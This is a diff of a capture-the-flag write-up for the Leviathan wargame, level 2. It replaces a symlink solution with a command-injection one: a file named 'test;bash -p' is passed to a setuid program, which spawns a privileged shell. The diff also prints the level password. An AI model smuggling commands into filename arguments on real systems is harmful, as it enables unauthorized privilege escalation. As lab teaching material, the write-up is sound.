@@ -32,7 +32,7 @@ puts("You cant have that file..."You cant have that file...
 +++ exited (status 1) +++
 ```
 
-Well that's strange; it doesn't seem to be calling any libraries, rather just automatically printing that I don't have access. It doesn't make sense that this would be the case for all files, otherwise the setuid binary would essentially be useless. Let's try with another file:
+Strange; it doesn't seem to be calling any libraries, rather just automatically printing that I don't have access. It doesn't make sense that this would be the case for all files, otherwise the setuid binary would essentially be useless. Let's try with another file:
 
 **`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2`**  
 ```
@@ -49,7 +49,21 @@ system("/bin/cat /etc/leviathan_pass/lev"...mEh5PNl10e
 +++ exited (status 0) +++
 ```
 
-Well here we go; it makes dynamic library calls for other input files, just not for /etc/leviathan_pass/leviathan3. Perhaps it is conditionally programmed such that for that exact file, it prints the "can't have that file" output. To exploit this, we need to reference another filename in the binary input, while at the same time, actually reading the contents of our intended target file. We can create a symbolic link for this purpose:
+Here we go. There are several things going on here:
+* The `access()` function checks whether we have read permissions to the file referenced in our setuid binary execution argument
+* A string is built, using `snprintf()`, concatenating `/bin/cat` with the filename in question
+* The `setreuid()` function sets both the real and effective UID to leviathan3
+* The `system()` function calls the concatenated string built earlier and executes
 
-**`leviathan2@gibson:~$ mkdir /tmp/rajh/`**  
-**`leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/rajh/test.txt`**  
+As stated above, any "filename" (that we have read permissions for) that is passed to the concatenated string will be executed by `system()`, AFTER `setreuid()` sets the real/effective UID to leviathan3. We can therefore fool the `system()` function into accepting a filename with a command appended to it, since there doesn't seem to be any proper input validation in place:
+
+**`leviathan2@gibson:~$ mkdir /tmp/rajh`**  
+**`leviathan2@gibson:~$ touch "/tmp/rajh/test;bash -p"`**  
+**`leviathan2@gibson:~$ ./printfile "/tmp/rajh/test;bash -p"`**  
+*`/bin/cat: /tmp/rajh/test: No such file or directory`*  
+*`leviathan3@gibson:~$`*  
+
+So rather than `./printfile` interpreting my referenced file as one file, it interpreted it as a file AND a command; it first executed `/bin/cat /tmp/rajh/test` (which didn't exist), and then executed `bash -p`, which spawned a shell as leviathan3.
+
+**`leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3`**  
+*`Q0G8j4sakn`*  
